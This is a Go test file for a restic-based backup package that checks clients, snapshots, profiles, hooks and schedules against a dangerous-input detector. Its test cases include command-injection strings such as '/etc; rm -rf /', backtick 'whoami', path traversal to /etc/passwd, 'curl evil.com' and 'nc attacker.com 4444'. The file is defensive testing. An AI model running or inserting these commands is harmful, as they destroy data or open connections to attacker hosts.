package backup

import (
	"context"
	"encoding/json"
	"path/filepath"
	"strings"
	"testing"

	"github.com/CodeMonkeyCybersecurity/eos/pkg/eos_io"
	"go.uber.org/zap"
)

func TestNewClient(t *testing.T) {
	logger := zap.NewNop()
	rc := &eos_io.RuntimeContext{
		Ctx: context.Background(),
		Log: logger,
	}

	tmpDir := t.TempDir()
	configPath := filepath.Join(tmpDir, "backup.yaml")
	origRead := configReadCandidates
	origWritePath := configWritePath
	origWriteDir := configWriteDir
	t.Cleanup(func() {
		configReadCandidates = origRead
		configWritePath = origWritePath
		configWriteDir = origWriteDir
	})
	configReadCandidates = []string{configPath}
	configWritePath = configPath
	configWriteDir = tmpDir

	cfg := &Config{
		DefaultRepository: "local",
		Repositories: map[string]Repository{
			"local": {Name: "local", Backend: "local", URL: filepath.Join(tmpDir, "repo")},
		},
		Profiles: map[string]Profile{
			"system": {Name: "system", Repository: "local", Paths: []string{tmpDir}},
		},
	}
	if err := SaveConfig(rc, cfg); err != nil {
		t.Fatalf("SaveConfig() error = %v", err)
	}

	t.Run("create client with default config", func(t *testing.T) {
		// This will use the default config since no config file exists
		client, err := NewClient(rc, "local")

		if err != nil {
			t.Logf("NewClient failed (expected if config issues): %v", err)
			return
		}

		if client == nil {
			t.Error("NewClient should return a client instance")
			return
		}

		if client.rc != rc {
			t.Error("Client should store runtime context")
		}

		if client.config == nil {
			t.Error("Client should have config")
		}

		if client.repository == nil {
			t.Error("Client should have repository")
		}
	})

	t.Run("create client with nonexistent repository", func(t *testing.T) {
		client, err := NewClient(rc, "nonexistent")

		if err == nil {
			t.Error("NewClient should fail for nonexistent repository")
		}

		if client != nil {
			t.Error("NewClient should return nil client on error")
		}

		if !strings.Contains(err.Error(), "not found") {
			t.Errorf("Error should mention repository not found: %v", err)
		}
	})
}

func TestClientSecurity(t *testing.T) {
	t.Run("restic command validation", func(t *testing.T) {
		// Test various restic commands for security issues
		testCommands := []struct {
			name      string
			args      []string
			dangerous bool
		}{
			{
				name:      "valid backup command",
				args:      []string{"backup", "/etc", "/var/lib/eos"},
				dangerous: false,
			},
			{
				name:      "valid snapshots command",
				args:      []string{"snapshots", "--json"},
				dangerous: false,
			},
			{
				name:      "command injection attempt",
				args:      []string{"backup", "/etc; rm -rf /"},
				dangerous: true,
			},
			{
				name:      "path traversal attempt",
				args:      []string{"backup", "../../../etc/passwd"},
				dangerous: true,
			},
			{
				name:      "shell command injection",
				args:      []string{"backup", "/etc", "--tag", "test`whoami`"},
				dangerous: true,
			},
		}

		for _, tt := range testCommands {
			t.Run(tt.name, func(t *testing.T) {
				for _, arg := range tt.args {
					containsDangerous := containsAnyDangerousBackup(arg)

					if tt.dangerous && !containsDangerous {
						t.Logf("Dangerous command not detected: %v", tt.args)
					}

					if !tt.dangerous && containsDangerous {
						t.Errorf("Safe command flagged as dangerous: %v", tt.args)
					}
				}
			})
		}
	})

	t.Run("environment variable security", func(t *testing.T) {
		// Test environment variable handling
		testEnvs := []struct {
			name  string
			key   string
			value string
			safe  bool
		}{
			{
				name:  "valid restic repository",
				key:   "RESTIC_REPOSITORY",
				value: "/var/lib/eos/backups",
				safe:  true,
			},
			{
				name:  "command injection in repository",
				key:   "RESTIC_REPOSITORY",
				value: "/var/lib/eos/backups; rm -rf /",
				safe:  false,
			},
			{
				name:  "command injection in env key",
				key:   "RESTIC_REPOSITORY; curl evil.com",
				value: "/var/lib/eos/backups",
				safe:  false,
			},
		}

		for _, tt := range testEnvs {
			t.Run(tt.name, func(t *testing.T) {
				keyDangerous := containsAnyDangerousBackup(tt.key)
				valueDangerous := containsAnyDangerousBackup(tt.value)

				if !tt.safe && !keyDangerous && !valueDangerous {
					t.Logf("Unsafe environment variable not detected: %s=%s", tt.key, tt.value)
				}

				if tt.safe && (keyDangerous || valueDangerous) {
					t.Errorf("Safe environment variable flagged as dangerous: %s=%s", tt.key, tt.value)
				}
			})
		}
	})
}

func TestSnapshot(t *testing.T) {
	t.Run("snapshot structure validation", func(t *testing.T) {
		// Test snapshot JSON structure
		snapshotJSON := `{
			"id": "a1b2c3d4e5f6",
			"time": "2023-01-01T12:00:00Z",
			"tree": "tree123",
			"paths": ["/etc", "/var/lib/eos"],
			"hostname": "server1",
			"username": "root",
			"tags": ["system", "daily"],
			"parent": "parent123"
		}`

		var snapshot Snapshot
		if err := json.Unmarshal([]byte(snapshotJSON), &snapshot); err != nil {
			t.Errorf("Failed to unmarshal snapshot: %v", err)
			return
		}

		// Validate snapshot fields
		if snapshot.ID == "" {
			t.Error("Snapshot should have ID")
		}

		if snapshot.Time.IsZero() {
			t.Error("Snapshot should have timestamp")
		}

		if len(snapshot.Paths) == 0 {
			t.Error("Snapshot should have paths")
		}

		if snapshot.Hostname == "" {
			t.Error("Snapshot should have hostname")
		}

		// Check for injection attempts in snapshot fields
		fields := []string{
			snapshot.ID, snapshot.Tree, snapshot.Hostname,
			snapshot.Username, snapshot.Parent,
		}

		fields = append(fields, snapshot.Tags...)
		fields = append(fields, snapshot.Paths...)

		for i, field := range fields {
			if containsAnyDangerousBackup(field) {
				t.Errorf("Snapshot field %d contains dangerous characters: %s", i, field)
			}
		}
	})
}

func TestBackupProfile(t *testing.T) {
	t.Run("profile validation", func(t *testing.T) {
		tests := []struct {
			name    string
			profile Profile
			valid   bool
		}{
			{
				name: "valid system profile",
				profile: Profile{
					Name:       "system",
					Repository: "local",
					Paths:      []string{"/etc", "/var/lib/eos"},
					Excludes:   []string{"*.tmp", "*.cache"},
					Tags:       []string{"system", "daily"},
				},
				valid: true,
			},
			{
				name: "profile with dangerous path",
				profile: Profile{
					Name:       "malicious",
					Repository: "local",
					Paths:      []string{"/etc; rm -rf /"},
					Tags:       []string{"system"},
				},
				valid: false,
			},
			{
				name: "profile with dangerous exclude",
				profile: Profile{
					Name:       "malicious",
					Repository: "local",
					Paths:      []string{"/etc"},
					Excludes:   []string{"*.tmp; curl evil.com"},
				},
				valid: false,
			},
			{
				name: "profile with dangerous tag",
				profile: Profile{
					Name:       "malicious",
					Repository: "local",
					Paths:      []string{"/etc"},
					Tags:       []string{"system`whoami`"},
				},
				valid: false,
			},
		}

		for _, tt := range tests {
			t.Run(tt.name, func(t *testing.T) {
				// Check profile fields for dangerous content
				fields := []string{tt.profile.Name, tt.profile.Repository, tt.profile.Host}
				fields = append(fields, tt.profile.Paths...)
				fields = append(fields, tt.profile.Excludes...)
				fields = append(fields, tt.profile.Tags...)

				hasDangerous := false
				for _, field := range fields {
					if containsAnyDangerousBackup(field) {
						hasDangerous = true
						break
					}
				}

				if tt.valid && hasDangerous {
					t.Errorf("Valid profile flagged as dangerous: %s", tt.profile.Name)
				}

				if !tt.valid && !hasDangerous {
					t.Logf("Invalid profile not flagged as dangerous: %s", tt.profile.Name)
				}
			})
		}
	})
}

func TestHumanizeBytes(t *testing.T) {
	tests := []struct {
		bytes    int64
		expected string
	}{
		{0, "0 B"},
		{512, "512 B"},
		{1024, "1.0 KiB"},
		{1536, "1.5 KiB"},
		{1048576, "1.0 MiB"},
		{1073741824, "1.0 GiB"},
		{1099511627776, "1.0 TiB"},
	}

	for _, tt := range tests {
		t.Run(tt.expected, func(t *testing.T) {
			result := humanizeBytes(tt.bytes)
			if result != tt.expected {
				t.Errorf("humanizeBytes(%d) = %s, want %s", tt.bytes, result, tt.expected)
			}
		})
	}
}

func TestBackupHooks(t *testing.T) {
	t.Run("hook command validation", func(t *testing.T) {
		tests := []struct {
			name     string
			commands []string
			safe     bool
		}{
			{
				name:     "safe backup hooks",
				commands: []string{"systemctl stop myservice", "mysql dump backup"},
				safe:     true,
			},
			{
				name:     "dangerous hooks",
				commands: []string{"rm -rf /", "curl evil.com", "nc attacker.com 4444"},
				safe:     false,
			},
			{
				name:     "command injection in hooks",
				commands: []string{"systemctl stop myservice; rm -rf /"},
				safe:     false,
			},
		}

		for _, tt := range tests {
			t.Run(tt.name, func(t *testing.T) {
				hooks := &Hooks{
					PreBackup:  tt.commands,
					PostBackup: tt.commands,
					OnError:    tt.commands,
				}

				// Check all hook commands for dangerous content
				allCommands := append(hooks.PreBackup, hooks.PostBackup...)
				allCommands = append(allCommands, hooks.OnError...)

				hasDangerous := false
				for _, cmd := range allCommands {
					if containsAnyDangerousBackup(cmd) {
						hasDangerous = true
						break
					}
				}

				if tt.safe && hasDangerous {
					t.Errorf("Safe hooks flagged as dangerous: %v", tt.commands)
				}

				if !tt.safe && !hasDangerous {
					t.Logf("Dangerous hooks not flagged: %v", tt.commands)
				}
			})
		}
	})
}

func TestScheduleValidation(t *testing.T) {
	t.Run("cron expression validation", func(t *testing.T) {
		tests := []struct {
			name  string
			cron  string
			valid bool
		}{
			{
				name:  "valid daily backup",
				cron:  "0 2 * * *",
				valid: true,
			},
			{
				name:  "valid hourly backup",
				cron:  "0 * * * *",
				valid: true,
			},
			{
				name:  "command injection attempt",
				cron:  "0 2 * * *; rm -rf /",
				valid: false,
			},
			{
				name:  "shell command in cron",
				cron:  "0 2 * * * && curl evil.com",
				valid: false,
			},
		}

		for _, tt := range tests {
			t.Run(tt.name, func(t *testing.T) {
				schedule := &Schedule{
					Cron: tt.cron,
				}

				containsDangerous := containsAnyDangerousBackup(schedule.Cron)

				if tt.valid && containsDangerous {
					t.Errorf("Valid cron expression flagged as dangerous: %s", tt.cron)
				}

				if !tt.valid && !containsDangerous {
					t.Logf("Invalid cron expression not flagged: %s", tt.cron)
				}
			})
		}
	})

	t.Run("systemd calendar validation", func(t *testing.T) {
		tests := []struct {
			name     string
			calendar string
			valid    bool
		}{
			{
				name:     "valid daily calendar",
				calendar: "daily",
				valid:    true,
			},
			{
				name:     "valid weekly calendar",
				calendar: "weekly",
				valid:    true,
			},
			{
				name:     "command injection in calendar",
				calendar: "daily; rm -rf /",
				valid:    false,
			},
		}

		for _, tt := range tests {
			t.Run(tt.name, func(t *testing.T) {
				schedule := &Schedule{
					OnCalendar: tt.calendar,
				}

				containsDangerous := containsAnyDangerousBackup(schedule.OnCalendar)

				if tt.valid && containsDangerous {
					t.Errorf("Valid calendar expression flagged as dangerous: %s", tt.calendar)
				}

				if !tt.valid && !containsDangerous {
					t.Logf("Invalid calendar expression not flagged: %s", tt.calendar)
				}
			})
		}
	})
}

func TestPasswordRetrieval(t *testing.T) {
	logger := zap.NewNop()
	rc := &eos_io.RuntimeContext{
		Ctx: context.Background(),
		Log: logger,
	}

	// Create a mock client for testing
	client := &Client{
		rc: rc,
		repository: &Repository{
			Name:    "test",
			Backend: "local",
			URL:     "/tmp/test-repo",
		},
	}

	t.Run("password retrieval logic", func(t *testing.T) {
		// This will likely fail since Vault won't be available in test
		password, err := client.getRepositoryPassword()

		if err != nil {
			t.Logf("Password retrieval failed (expected in test): %v", err)
		} else {
			// Validate password doesn't contain dangerous characters
			if containsAnyDangerousBackup(password) {
				t.Error("Retrieved password contains dangerous characters")
			}

			if password == "" {
				t.Error("Password should not be empty")
			}

			t.Logf("Successfully retrieved password (length: %d)", len(password))
		}
	})
}

func TestResticIntegration(t *testing.T) {
	logger := zap.NewNop()
	rc := &eos_io.RuntimeContext{
		Ctx: context.Background(),
		Log: logger,
	}

	t.Run("restic command execution", func(t *testing.T) {
		// Create a mock client
		client := &Client{
			rc: rc,
			repository: &Repository{
				Name:    "test",
				Backend: "local",
				URL:     "/tmp/test-repo",
			},
		}

		// Test restic version command (most likely to succeed)
		output, err := client.RunRestic("version")

		if err != nil {
			t.Logf("Restic command failed (expected if restic not installed): %v", err)
		} else {
			t.Logf("Restic version output: %s", string(output))

			// Validate output doesn't contain injection attempts
			if containsAnyDangerousBackup(string(output)) {
				t.Error("Restic output contains dangerous characters")
			}
		}
	})
}

func TestBackupWorkflow(t *testing.T) {
	t.Run("complete backup workflow", func(t *testing.T) {
		// This test documents the expected backup workflow
		steps := []string{
			"1. Load configuration",
			"2. Create backup client",
			"3. Initialize repository (if needed)",
			"4. Execute pre-backup hooks",
			"5. Run backup with progress monitoring",
			"6. Apply retention policy",
			"7. Execute post-backup hooks",
			"8. Send notifications",
		}

		for i, step := range steps {
			t.Logf("Backup workflow step %d: %s", i+1, step)
		}

		// Verify the workflow doesn't contain dangerous operations
		for _, step := range steps {
			if containsAnyDangerousBackup(step) {
				t.Errorf("Backup workflow step contains dangerous content: %s", step)
			}
		}
	})
}
